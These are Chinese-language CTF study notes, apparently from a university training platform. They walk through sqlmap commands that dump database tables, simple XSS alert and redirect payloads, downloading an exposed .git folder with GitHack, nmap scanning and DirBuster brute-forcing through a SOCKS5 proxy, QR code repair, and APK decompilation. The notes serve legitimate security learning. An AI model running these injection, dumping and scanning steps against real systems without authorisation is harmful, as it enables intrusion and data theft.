#### 1. ZJU School-Bus
welcome -- SQL-injection(web)
使用sqlmap获取数据库信息：
1. 获取当前数据库名称:
	python sqlmap.py -u "http://...?id=1" --current-db
2. 列出指定数据库的所有表:
	python sqlmap.py -u "http://...?id=1" -D your_database_name --tables
3. 列出指定表的所有列:
	python sqlmap.py -u "http://...?id=1" -D your_database_name -T your_table_name --columns
4. 导出列数据:
	python sqlmap.py -u "http://...?id=1" -D your_database_name -T your_table_name -C your_column_name --dump

#### 2. ZJU School-Bus
welcome -- EasyWeb(web)
- F12打开开发工具查看源码（Elements）（Ctrl + U查看HTML源代码）
- 检查网页备份文件 -- 直接访问尝试：在已知文件（如`index.php`）后添加`.bak`等后缀尝试访问下载
	适用条件：开发者手动创建或压缩工具生成，有时编辑器也会自动生成带`~`的备份
- 检测XSS注入点：`<script>alert("CTF")</script>`插入JS检查是否弹出警告框
	通过推断使用XSS跳转网页（曾以the2nd.php作为第二关，尝试
	`<script>window.location = "3rd.php"</script>`等）
- 看请求返回的header: 
	1. F12→Network
	2. F5刷新
	3. 选择Name中第一个.php文件
	4. headers中找到Response Headers查看
	5. 按照提示跳转下一关
- 已知flag位置，但鼠标悬停时消失→判断为JS设置
	F1：Ctrl + Shift + P打开命令面板禁用JS(Disable JavaScript)

#### 3. ZJU School-Bus
welcome -- QR Code(misc)
- 二维码三个回字形缺失，使用图片编辑补全后扫码获得flag
二维码最常见、最简单的修改：
1. **定位图案**：
    - **问题**：三个角落的“回”字形定位图案是否被破坏、遮挡或修改？
    - **解决**：用画图工具（如Photoshop, GIMP）将其修复成标准样式。这是二维码扫描器能够定位图像的关键。
        
2. **安静区**：
    - **问题**：二维码四周的空白区域（安静区）是否足够？是否被添加了边框、文字或图案？
    - **解决**：确保四周有至少4个模块宽度的空白区域。清除任何干扰项。
        
3. **颜色反转**：
    - **问题**：是否是反色的二维码（浅底深码）？
    - **解决**：用图片编辑工具进行颜色反转，或者直接用扫描APP的反色功能尝试。
        
4. **格式信息**：
    - **问题**：围绕定位图案的格式信息区域可能被破坏，导致扫描器无法识别纠错等级和掩码模式。
    - **解决**：使用专门的QR分析工具（如 [QRazyBox](https://merri.cx/qrazybox/)）来手动修复格式信息。你可以尝试所有可能的组合（8种掩码模式 x 4个纠错等级），直到能正确解码

#### 4. ZJU School-Bus
welcome -- git leak(web)
1. 确认是否存在git leak：
	访问 `http://target.com/.git/`，如果服务器返回403（Forbidden）而不是404（Not Found），则很有可能存在。返回403说明这个目录是存在的，只是目录列表被禁止了。如果返回404，则可能不存在。

	更可靠的方法是使用工具扫描，或者尝试下载一个Git核心文件来确认：  
	`http://target.com/.git/HEAD`。这个文件通常存在且内容为 `ref: refs/heads/master`。如果能成功下载，则100%确认存在Git泄露。

2. 下载整个.git文件夹
	- 尝试了**使用githacker**（一个python工具），但较新版本的Ubuntu系统禁止直接使用pip安装系统级的安装包（`pip install githacker`），以防止破坏系统依赖。**可以尝试使用python虚拟环境解决。**
	- **使用GitHack**：从github上下载工具：[[commands#git clone|参见github笔记]]
```bash
	# 下载工具
	git clone https://github.com/lijiejie/GitHack.git
	cd GitHack

	# 使用
	python3 GitHack.py http://target.com/.git/
```
3. 搜索下载的git仓库
	- 查看当前文件`cd` `ls`
	- 查看提交历史`git log`或更详细`git log --oneline --graph --all`
	- ......
 4. 根据文件找到flag，题中为一串MD5加密([[MD5 | 参见MD5笔记]])的内容，通过cmd5.com在线解密
 5. **继续学习**：运维的基本素养--怎么配置Apache或者Nginx防止出现git leak

#### 5. ZJU School-Bus
welcome -- Scan(web)
1. 根据提示通过本地运行`ssh user@10.214.160.13 -p 10802 -D 10899 -N`，并输入密码来开启在本机 10899 端口的 SOCKS5 代理服务([[ssh| 什么是SSH]])([[SOCKS5 | 什么是SOCKS5]])（[[ssh | ssh命令基础用法]]）
（[[端口（Port）| 什么是端口]])
2. 题目提示： 以下所有域名均应在 SOCSK5 代理后才可访问(可以使用 proxychains4 等工具)
	注：由于ssh命令中 -N 只建立隧道，而不执行远程命令，接下来的命令需要再打开一个终端执行。
	
	配置proxychains4 （使后续nmap、curl等可通过代理工作）：[[SOCKS5#Proxychains 配置 | 关于proxychains配置]]
	
```bash
	# 创建并编辑配置文件
	nano proxy.conf #或使用echo "" > proxy.conf等等效命令
	
	# 配置文件内容
	[ProxyList]
	socks5 127.0.0.1 10899
	# socks5指定代理协议类型为SOCKS5
	# 127.0.0.1为本地回环地址（localhost），表示本机（本地代理开在自己电脑上）
	# 10899是端口号，这是SSH命令中"-D 10899"指定的端口,即指定一个创建好的代理使用
```
3. 使用nmap 按照题目要求扫描zju.tools(192.168.192.3)在9000-11000范围内的SSH端口：[[proxychains4#基本使用方法 | proxychains4使用方法]] [[端口扫描与nmap]]
```bash
# 使用proxychains通过代理扫描
proxychains4 -f proxy.conf nmap -sT -p9000-11000 192.168.192.3 -vv
```
此时终端返回
`Note: Host seems down. If it is really up, but blocking our ping probes,try -Pn`
原因是nmap 默认会先发送 ping 请求来确认主机是否存活。但在这个网络环境中：
- 目标主机 `192.168.192.3` 可能配置为不响应 ping 请求
- 或者由于代理环境，ping 请求无法正常工作
- 但主机实际上是存活的
解决可使用 `-Pn` 参数告诉 nmap **跳过主机发现，直接扫描端口**，即
```bash
proxychains4 -f proxy.conf nmap -sT -Pn -p9000-11000 192.168.192.3 -vv
```
注：如果一种扫描方式失败可以尝试其它扫描方式重新扫描，如SYN扫描（`-sS`）在某些网络环境下可能被干扰
扫描结果：
- **`10822/tcp open unknown`**：发现一个开放的TCP端口 **10822**
- **状态**：`open`（端口开放且可访问）
- **服务**：`unknown`（nmap无法自动识别服务类型）
- **原因**：`syn-ack`（收到了SYN-ACK响应，这是端口开放的典型标志）
其它信息：
- **`2000 closed tcp ports`**：其他2000个端口都是关闭的
- **`conn-refused`**：连接被拒绝，这是端口关闭的明确信号
4. 根据提议访问` http://192.168.192.8:[part1扫描出来的端口号]`
```bash
proxychains4 -f proxy.conf curl http://192.168.192.8:10822/
```
得到part1的flag和part2入口（目录爆破）[[目录爆破（Directory Brute-forcing）]]
5. 使用DirBuster进行目录爆破
	DirBuster使用**Java语言**编写,这类程序需要Java运行环境(JRE,Java Runtime Environment)才能执行。首先配置JRE（或JDK）
		`sudo apt install default-jre -y`
	在官网上下载相应文件后进入对应目录，运行
		`java -jar ~/path/DirBuster.jar`
		由于需要配置SOCKS5代理，实际运行
		`proxychains4 -f proxy.conf java -jar ~/path/DirBuster.jar`
		打开DirBuster GUI界面
		①在Target URL指定执行目录爆破发URL
		②设置Number Of Threads(线程数)，指同时执行的扫描任务的数量
		线程数增加可加快扫描速度，但线程数过高会对目标服务器造成过大压力/大量占用本地CPU和网络资源/出发网站防护机制，导致IP被封锁。
		速度与稳定性的平衡通常设置线程数为20~30
		③按照题目要求选择相应字典
		④根据题意爆破html文件--设置File extension为html
		⑤start!(耐心等待~)
6. 对爆破出的隐藏文件逐一尝试找到flag并提交

#### 6. ZJU School-Bus
welcome -- apk01baby(reverse)
1. `file apk01_LeadroyaL.apk`确认文件类型
2. `apktool d your_app.apk -o output_dir`反编译资源文件和`classes.dex`
	作用：解包APK，得到`smali`代码（Dalvik字节码的汇编语言）、`AndroidManifest.xml`（可读格式）、资源文件（`res`）和原生库（`lib`）。
3. 查看`AndroidManifest.xml`：重点关注入口Activity（`<action android:name="android.intent.action.MAIN" />`），说明应用启动时首先运行哪个界面。
4. `unzip -l your_app.apk`解压并检查基础结构
	重点关注以下文件：
	- `classes.dex`：包含Java/Kotlin代码编译后的Dalvik字节码。
	- `lib/`：目录，包含针对不同CPU架构（armeabi-v7a, arm64-v8a, x86等）的本地库（`.so`文件）。**CTF题目经常把关键逻辑藏在原生层。**
	- `resources.arsc`：编译后的资源文件。
    - `assets/`：目录，存放原始资源文件，可能藏有数据、配置文件甚至另一个可执行文件。
    - `META-INF/`：存放签名信息。
5. 反编译DEX文件获取Java代码
	- `smali`代码可读性差，需要更高级的反编译工具（Jadx）获取近似的Java源代码
	- `jadx-gui apk01_LeadroyaL.apk`